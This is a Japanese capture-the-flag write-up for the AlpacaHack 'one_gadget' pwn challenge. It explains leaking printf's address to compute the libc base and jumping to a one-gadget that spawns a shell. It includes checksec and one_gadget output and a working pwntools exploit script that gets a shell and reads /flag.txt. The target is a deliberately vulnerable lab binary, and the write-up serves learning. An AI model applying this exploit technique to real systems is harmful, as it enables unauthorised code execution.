# one_gadget

https://alpacahack.com/daily-bside/challenges/one-gadget

## 問題の概要

shell を起動できるような one gadget を探して、そこにジャンプさせる PWN 問題です。

サーバーに接続すると `printf` のアドレスが表示され、`scanf("%p%*c", (void **)&f_ptr)` で入力したアドレスを `f_ptr(NULL)` のように呼び出してくれます。

フラグは `/flag.txt` に配置されています。

### バイナリ情報

```bash
$ checksec handout/chal
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## 解法

関数アドレスはランダム化されていますが、`printf` のアドレスがリークされるため、`libc` のベースアドレスを特定できます。

最終的に `execve("/bin/sh", NULL, NULL)` などが呼び出されるようなアドレスが `libc` 内に存在すれば、そこにジャンプさせることでシェルを起動できます。

本当にそんなものが存在するのか？と半信半疑でしたが、これは CTF では one gadget と呼ばれるもので、[`one_gadget`](https://github.com/david942j/one_gadget) というツールで探すことができるそうです。

### one_gadget を試してみる

インストールして `one_gadget` を実行してみます。

```bash
$ one_gadget ./libc.so.6
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

one gadget のアドレスの候補と、成功するためのレジスタやメモリの内容の条件が表示されます。

`one_gadget -o json -l 1 ./libc.so.6` で可能性が低いものも含めて全ての候補を JSON 形式で出力し、[try_one_gadget.py](try_one_gadget.py) で全候補を試してみたのですが、全て失敗してしまいました。

いくつかの one gadget の候補を使用したときの挙動を pwndbg で確認してみたのですが、`execvpe` 関数内のアドレスにジャンプするものがあと一歩のところで失敗している感じでした。

### アドレスの全探索

試しに `execvpe` 関数内の全ての命令のアドレスを one gadget の候補として試してみることにしました。

候補数が多いので、ネットワークスタックを挟まずにコンテナ内で直接プロセスを起動するスクリプトを実行します。

- スクリプト: [find_gadget.py](find_gadget.py)
- 実行結果: [execvpe.txt](execvpe.txt)

フラグが出力される one gadget がいくつか見つかり、これを使用してフラグを取得することができました。

## 解答に使用したコード

```python
from pwn import remote

offset = 0xEF2D3

conn = remote(host, port)
conn.recvuntil(b"printf @ ")
printf_runtime_addr = int(conn.recvline().strip().decode(), 16)

print(f"printf runtime address: {hex(printf_runtime_addr)}")

printf_offset = 0x60100
base_addr = printf_runtime_addr - printf_offset

conn.sendlineafter(b"> ", hex(base_addr + offset).encode())
conn.sendline(b"cat /flag.txt")
conn.interactive()
```
